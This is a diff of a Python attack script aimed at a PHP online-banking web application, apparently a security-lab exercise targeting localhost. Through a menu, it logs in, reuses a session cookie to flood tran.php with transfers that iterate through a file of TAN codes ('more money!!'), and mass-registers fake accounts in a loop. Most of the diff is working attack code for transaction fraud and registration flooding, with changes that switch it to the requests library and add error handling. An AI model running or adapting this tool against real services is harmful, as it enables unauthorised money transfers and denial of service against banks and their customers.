@@ -2,6 +2,7 @@ __author__ = 'lorenzodonini'
 
 import http.client
 import datetime
+import requests
 
 def createHttpConnection(host, port):
     conn = http.client.HTTPConnection(host,port)
@@ -18,7 +19,7 @@ def createHeaders(session_id = None, content = None):
 
 def login(host,port):
     conn = createHttpConnection(host,port)
-    headers = createHeaders()
+    headers = createHeaders(content='application/x-www-form-urlencoded')
     page = 'login.php'
     username = input('Insert username: ')
     pw = input('Insert password: ')
@@ -51,21 +52,6 @@ def register(conn,headers,user,firstname,lastname,email,pw,address,phone,getId=F
 
     return None
 
-def followRegistrationRedirect(conn,redirection):
-    fields = redirection.split('PHPSESSID=')
-    page = 'customer_home.php?'
-    session = fields[1]
-    headers = createHeaders(session)
-    #Sending the get request
-    conn.request('GET','/'+page)
-
-    #Receiving the response
-    resp = conn.getresponse()
-    data = resp.read()
-    data = data.decode()
-    print(data)
-    return 0
-
 def floodRegistration(host,port):
     headers = createHeaders(None,'application/x-www-form-urlencoded')
     firstname = input('Enter the firstname to register: ')
@@ -94,37 +80,39 @@ def floodRegistration(host,port):
         if (i>0 and i%1000 == 0):
             oldTime = time
             time = datetime.datetime.now()
-            print("1000 registrations completed. Time elapsed: "+str(time-oldTime))
+            print("Performed 1000 registrations.")
+            #print("1000 registrations completed. Time elapsed: "+str(time-oldTime))
 
     return result
 
 
-def sendTransactionRequest(conn,headers,account,amount,tan,comment):
-    params = 'account='+str(account)+'&amount='+str(amount)+'&tan='+tan+'&comment='+comment
-    page = 'tran.php?'
-    #Sending the post request
-    conn.request('POST','/'+page,params,headers)
 
-    #Receiving now the response
-    resp = conn.getresponse()
-    if (resp.status != 200):
-        print("HTTP request unsuccessful: "+resp.status+" "+resp.reason)
+def sendTransactionRequest(host,port,conn,header,account,amount,tan,comment):
+    params = {'account':account,'amount':amount,'tan':tan,'comment':comment}
+    page = '/tran.php'
+    url = 'http://'+host+':'+str(port)+page
+    resp = conn.post(url,data=params,headers=header)
+    if (resp.status_code != 200):
+        print("HTTP request unsuccessful: "+str(resp.status_code)+" "+str(resp.reason))
         return -1
-    #Not reading response since we don't really need it
     return 0
 
-def floodTransactions(host,port,account,session,start,end):
-    headers = createHeaders(session,'application/x-www-form-urlencoded')
+def floodTransactions(host,port,session,account,start=0,end=0):
+    headers = createHeaders(content='application/x-www-form-urlencoded')
     tans = readTansFromFile('tans.txt')
+    amount = int(input('Insert an amount for every transaction: '))
     start = int(input('Insert the start TAN: '))
-    end = int(input('Inser the end TAN: '))
+    end = int(input('Insert the end TAN: '))
+    conn = requests.Session() #Requests <3
+    conn.cookies.set('PHPSESSID',session)
     for i in range(start,end):
         selectedTan = tans[i]
-        conn = createHttpConnection(host,port)
-        code = sendTransactionRequest(conn,headers,account,10,selectedTan,'testing')
+        code = sendTransactionRequest(host,port,conn,headers,account,amount,selectedTan,'more money!!')
         if code < 0:
             print("Aborting procedure")
             return
+        else:
+            print("Transaction succeeded for TAN "+selectedTan)
         conn.close()
 
 
@@ -144,7 +132,7 @@ def readTansFromFile(filename):
         tan = tan.strip()
         tans.append(tan)
 
-    #Already sorted by TAN number. You can simply access a specific tan using indexes
+    #Already sorted by TAN number. We can simply access a specific tan using indexes
     return tans
 
 def setupHost():
@@ -153,13 +141,13 @@ def setupHost():
     return (host,port)
 
 def setupAccount():
-    account = input('Inser the account number: ')
+    account = input('Insert the account number: ')
     return account
 
 def main():
-    ACCOUNT = 194431
-    HOST = 'localhost'
-    PORT = 8080
+    ACCOUNT = 102678 #DEFAULT
+    HOST = 'localhost' #DEFAULT
+    PORT = 8080 #DEFAULT
     session_id = None
 
     print('Select an operation:')
@@ -173,15 +161,30 @@ def main():
     operation = int(operation)
     while operation != 0:
         if operation == 1:
-            HOST,PORT = setupHost()[0:2]
+            try:
+                HOST,PORT = setupHost()[0:2]
+            except:
+                print("Coudln't setup host")
         elif operation == 2:
-            session_id = login(HOST,PORT)
+            try:
+                session_id = login(HOST,PORT)
+            except:
+                print("Error while trying to log in")
         elif operation == 3:
-            ACCOUNT = setupAccount()
+            try:
+                ACCOUNT = setupAccount()
+            except:
+                print("Error while setting up account")
         elif operation == 4:
-            floodTransactions(HOST, PORT, ACCOUNT, session_id)
+            try:
+                floodTransactions(HOST, PORT, session_id, ACCOUNT)
+            except:
+                print("Error while performing a transaction flood")
         elif operation == 5:
-            floodRegistration(HOST, PORT)
+            try:
+                floodRegistration(HOST, PORT)
+            except:
+                print("Error while performing a registration flood")
         operation = input('Command: ')
         operation = int(operation)
 
